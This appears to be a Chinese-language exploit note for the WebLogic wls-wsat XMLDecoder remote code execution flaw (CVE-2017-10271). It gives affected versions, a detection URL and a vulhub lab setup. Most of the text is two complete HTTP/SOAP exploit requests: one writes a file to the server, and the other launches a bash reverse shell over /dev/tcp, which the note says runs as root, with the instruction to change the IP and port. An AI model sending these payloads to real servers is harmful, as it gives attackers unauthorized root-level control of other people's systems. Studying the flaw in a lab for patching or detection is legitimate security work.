# 相关
CVE-2017-10271
- 受影响版本：10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0
- 漏洞描述：WebLogic WLS组件中存在CVE-2017-10271远程代码执行漏洞，可以构造请求对运行WebLogic中间件的主机进行攻击，近期发现此漏洞的利用方式为传播挖矿程序。
- 漏洞检测：访问http://host:7001/wls-wsat/CoordinatorPortType返回如下，则可能存在此漏洞
![title](https://i.loli.net/2019/05/20/5ce24e619807844967.jpg)

# 验证环境搭建
使用vulhub的cve-2018-2628搭建

# POC
通过写入一个文件的形式进行简单验证
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 127.0.0.1:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 748

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
         <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter"> 
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
                        <string>hello_world</string></void><void method="close"/>
                    </object>
            </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
</soapenv:Envelope>
```
写入的路径是`~/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt`
访问验证的路径是`/wls-wsat/test.txt`
# EXP
反弹shell,注意修改IP和端口，得到的shell是root权限
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 10.203.87.64:7001
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext
            xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&gt;&amp;1</string>
                        </void>
                    </array>
                    <void method="start"/></void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```